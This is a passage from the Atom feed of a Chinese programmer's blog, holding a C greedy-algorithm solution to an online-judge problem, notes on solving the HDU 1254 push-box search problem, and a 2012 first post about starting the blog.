<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include&lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">jf</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">double</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">double</span> <span class="n">f</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">double</span> <span class="n">average</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="n">JF</span><span class="p">;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">JF</span> <span class="o">*</span><span class="n">aa</span><span class="o">=</span><span class="p">(</span><span class="n">JF</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">;</span>
</span><span class='line'>    <span class="n">JF</span> <span class="o">*</span><span class="n">bb</span><span class="o">=</span><span class="p">(</span><span class="n">JF</span> <span class="o">*</span><span class="p">)</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">((</span><span class="n">aa</span><span class="o">-&gt;</span><span class="n">average</span><span class="p">)</span><span class="o">&gt;</span><span class="p">(</span><span class="n">bb</span><span class="o">-&gt;</span><span class="n">average</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="n">aa</span><span class="o">-&gt;</span><span class="n">average</span><span class="p">)</span><span class="o">&lt;</span><span class="p">(</span><span class="n">bb</span><span class="o">-&gt;</span><span class="n">average</span><span class="p">))</span>
</span><span class='line'>         <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">n</span><span class="p">,</span><span class="n">m</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d%d&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">m</span><span class="p">,</span><span class="o">&amp;</span><span class="n">n</span><span class="p">)</span><span class="o">!=</span><span class="n">EOF</span><span class="o">&amp;&amp;</span><span class="n">n</span><span class="o">!=-</span><span class="mi">1</span><span class="o">&amp;&amp;</span><span class="n">m</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">JF</span> <span class="n">k</span><span class="p">[</span><span class="mi">1000</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">double</span> <span class="n">sum</span><span class="p">;</span>
</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">n</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%lf %lf&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">j</span><span class="p">,</span><span class="o">&amp;</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">f</span><span class="p">);</span>
</span><span class='line'>            <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">average</span><span class="o">=</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">j</span><span class="o">/</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">f</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">qsort</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">JF</span><span class="p">),</span><span class="n">compare</span><span class="p">);</span>
</span><span class='line'>        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">n</span><span class="o">&amp;&amp;</span><span class="n">m</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">f</span><span class="o">&lt;=</span><span class="n">m</span><span class="p">)</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="n">m</span><span class="o">-=</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">f</span><span class="p">;</span>
</span><span class='line'>                <span class="n">sum</span><span class="o">+=</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">j</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>            <span class="k">else</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="n">sum</span><span class="o">+=</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">average</span><span class="o">*</span><span class="n">m</span><span class="p">;</span>
</span><span class='line'>                <span class="n">m</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%.3f</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">sum</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Problem 1005</h3>

<p>题目地址：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1254">推箱子</a></p>

<p>搜索题，但是比普通的搜索会麻烦上一点，你得考虑上箱子能不能被推动的情况，这需要满足些条件。</p>

<ol>
<li>移动方向前没墙。</li>
<li>移动方向后没墙。</li>
<li>人可以走到箱子的后面。（注意判断这个条件）</li>
</ol>


<p>用广度搜索可以找到最少的推动格子数，但是还得用深度搜索去检查人能否走到箱子的后面</p>

<p>这题代码比较长，我没去写，就不提供代码了。</p>

<br/>


<h4>好吧，今晚先写到这了，剩下的明天继续吧，回去洗洗睡了。</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hello Work]]></title>
    <link href="http://sunkid.me/blog/2012/03/31/hello-work/"/>
    <updated>2012-03-31T20:28:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/03/31/hello-work</id>
    <content type="html"><![CDATA[<p>这是一个已经搭建好很久的博客，只是一直没写过文章，原因很简单，一是懒，二是没啥墨水能下笔。
直到前两天在宿舍，<a href="http://www.tinpont.com/">@tinpont</a> 突然说要写博客,结果那晚全宿舍人就因这个话题吹水到了3点，囧~</p>

<p>为了避免第二晚再度引起这个话题导致又没得睡觉，隔天我们就果断买域名搭博客。
于是又点燃了我写博客的动力。</p>

<p>在这,偷偷链上我3个室友的博客，<a href="http://www.tinpont.com/">@tinpont</a> , <a href="http://www.schance.com/">@scant</a> , <a href="http://www.jqyang.com/">@NewBie</a> 求互粉=.=</p>

<p>好吧，说说这个博客，这篇博文的标题已经出卖了我是个程序员这个事实，我也只好认了。我常听说程序员都得写写神马博客的，于是我也跟着写写,希望那一天也能做个合格的程序员。</p>

<p>最后的最后，我想说一句:</p>

<h1>Hello Word!</h1>
]]></content>
  </entry>
  
</feed>
